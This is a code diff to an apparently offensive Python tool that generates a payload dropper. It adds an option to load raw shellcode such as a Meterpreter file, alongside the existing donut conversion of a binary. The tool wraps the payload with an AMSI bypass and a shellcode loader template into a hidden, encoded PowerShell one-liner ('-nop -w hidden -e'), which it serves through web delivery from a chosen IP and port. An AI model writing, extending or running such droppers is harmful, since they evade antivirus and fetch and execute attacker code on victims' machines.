@@ -10,21 +10,24 @@ from http.server import HTTPServer, SimpleHTTPRequestHandler
 
 
 def main(argv):
-    if(len(argv)<8):
+    if(len(argv)<6):
             print ('On Windows:\nGeneratePowershellLauncher.py -i 127.0.0.1 -p 8000 -b C:\\Windows\\System32\\calc.exe -a "some args"')
             print ('On linux:\nGeneratePowershellLauncher.py -i 127.0.0.1 -p 8000 -b ./calc.exe -a "some args"')
+            print ('On linux:\nGenerateDropperBinary.py -i 127.0.0.1 -p 8000 -r ./met.raw')
             exit()
 
     ip=""
     port=""
     binary=""
     binaryArgs=""
+    rawShellCode=""
 
-    opts, args = getopt.getopt(argv,"hi:p:b:a:",["ip=","port=","binary=","args="])
+    opts, args = getopt.getopt(argv,"hi:p:b:a:r:",["ip=","port=","binary=","args=","raw="])
     for opt, arg in opts:
             if opt == '-h':
                     print ('On Windows:\nGenerateDropperBinary.py -i 127.0.0.1 -p 8000 -b C:\\Windows\\System32\\calc.exe -a "some args"')
                     print ('On linux:\nGenerateDropperBinary.py -i 127.0.0.1 -p 8000 -b ./calc.exe -a "some args"')
+                    print ('On linux:\nGenerateDropperBinary.py -i 127.0.0.1 -p 8000 -r ./met.raw')
                     sys.exit()
             elif opt in ("-b", "--binary"):
                     binary = arg
@@ -34,26 +37,41 @@ def main(argv):
                     ip = arg
             elif opt in ("-p", "--port"):
                     port = arg
+            elif opt in ("-r", "--raw"):
+                    rawShellCode = arg
     
     print('[+] Generate dropper for params:')
     print('ip ', ip)
     print('port ', port)
-    print('binary ', binary)
-    print('binaryArgs ', binaryArgs)
-    print('')
 
-    if os.name == 'nt':
-            args = ('.\\ressources\\donut.exe', '-f', '2', '-m', 'go', '-p', binaryArgs, '-o', '.\\shellcode.b64', binary)
-    else:   
-            args = ('./ressources/donut', '-f', '2', '-m', 'go', '-p', binaryArgs, '-o', './shellcode.b64', '-i', binary)
-    popen = subprocess.Popen(args, stdout=subprocess.PIPE)
-    popen.wait()
-    output = popen.stdout.read()
-    
-    print("[+] Generate shellcode of payload with donut")
-    print(output.decode("utf-8") )
+    if binary:
+        print('binary ', binary)
+        print('binaryArgs ', binaryArgs)
+        print('')
 
-    shellcode = open("shellcode.b64", "rb").read()
+        if os.name == 'nt':
+                args = ('.\\ressources\\donut.exe', '-f', '2', '-m', 'go', '-p', binaryArgs, '-o', '.\\shellcode.b64', binary)
+        else:   
+                args = ('./ressources/donut', '-f', '2', '-m', 'go', '-p', binaryArgs, '-o', './shellcode.b64', '-i', binary)
+        popen = subprocess.Popen(args, stdout=subprocess.PIPE)
+        popen.wait()
+        output = popen.stdout.read()
+        
+        print("[+] Generate shellcode of payload with donut")
+        print(output.decode("utf-8") )
+
+        shellcode = open("shellcode.b64", "rb").read()
+
+    elif rawShellCode:
+        print('rawShellCode ', rawShellCode)
+        print('')
+
+        shellcode = open(rawShellCode, "rb").read()
+        shellcode = base64.b64encode(shellcode)
+
+        print(len(shellcode))
+
+
     amsiBypass = open("AmsiBypass.template", "rb").read()
     shellCodeLoader = open("ShellcodeLoader.template", "rb").read()
     oneLiner = open("oneLinerToExec.template", "rb").read()
@@ -93,7 +111,8 @@ def main(argv):
 #     oneLiner = "powershell.exe -nop -e {}".format(base64_bytes.decode("utf-8"))
     oneLiner = "powershell.exe -nop -w hidden -e {}".format(base64_bytes.decode("utf-8"))
 
-    os.remove("shellcode.b64")
+    if binary:
+        os.remove("shellcode.b64")
     print(oneLiner)
 
     print("[+] Web delivery on web server {} : {}".format(ip, port))
